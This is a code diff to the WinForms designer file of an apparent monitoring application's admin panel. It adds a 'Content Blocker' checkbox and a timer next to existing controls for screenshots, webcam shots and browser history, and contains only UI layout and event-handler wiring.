@@ -47,6 +47,7 @@
             this.textBox_Icon_path = new System.Windows.Forms.TextBox();
             this.label2 = new System.Windows.Forms.Label();
             this.groupBox_Functions = new System.Windows.Forms.GroupBox();
+            this.checkBox_BlockPorno = new System.Windows.Forms.CheckBox();
             this.checkBoxScreenShots = new System.Windows.Forms.CheckBox();
             this.checkBoxCamShots = new System.Windows.Forms.CheckBox();
             this.checkBoxBrowserHistory = new System.Windows.Forms.CheckBox();
@@ -62,6 +63,7 @@
             this.label4 = new System.Windows.Forms.Label();
             this.timerSession = new System.Windows.Forms.Timer(this.components);
             this.groupBoxMain = new System.Windows.Forms.GroupBox();
+            this.timer_porn_blocker = new System.Windows.Forms.Timer(this.components);
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDown_screenShotInterval)).BeginInit();
             this.panelBody.SuspendLayout();
             this.groupBox_Functions.SuspendLayout();
@@ -249,6 +251,7 @@
             // 
             // groupBox_Functions
             // 
+            this.groupBox_Functions.Controls.Add(this.checkBox_BlockPorno);
             this.groupBox_Functions.Controls.Add(this.checkBoxScreenShots);
             this.groupBox_Functions.Controls.Add(this.checkBoxCamShots);
             this.groupBox_Functions.Controls.Add(this.checkBoxBrowserHistory);
@@ -259,6 +262,17 @@
             this.groupBox_Functions.TabIndex = 4;
             this.groupBox_Functions.TabStop = false;
             this.groupBox_Functions.Text = "Functions";
+            // 
+            // checkBox_BlockPorno
+            // 
+            this.checkBox_BlockPorno.AutoSize = true;
+            this.checkBox_BlockPorno.Location = new System.Drawing.Point(558, 20);
+            this.checkBox_BlockPorno.Name = "checkBox_BlockPorno";
+            this.checkBox_BlockPorno.Size = new System.Drawing.Size(102, 17);
+            this.checkBox_BlockPorno.TabIndex = 1;
+            this.checkBox_BlockPorno.Text = "Content Blocker";
+            this.checkBox_BlockPorno.UseVisualStyleBackColor = true;
+            this.checkBox_BlockPorno.CheckedChanged += new System.EventHandler(this.checkBox_BlockPorno_CheckedChanged);
             // 
             // checkBoxScreenShots
             // 
@@ -424,6 +438,11 @@
             this.groupBoxMain.TabIndex = 5;
             this.groupBoxMain.TabStop = false;
             // 
+            // timer_porn_blocker
+            // 
+            this.timer_porn_blocker.Interval = 1000;
+            this.timer_porn_blocker.Tick += new System.EventHandler(this.timer_porn_blocker_Tick);
+            // 
             // FrmAdminPanel
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -489,6 +508,8 @@
         private System.Windows.Forms.TextBox textBox_logsPath;
         private System.Windows.Forms.Label label5;
         private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Timer timer_porn_blocker;
+        private System.Windows.Forms.CheckBox checkBox_BlockPorno;
 
     }
 }
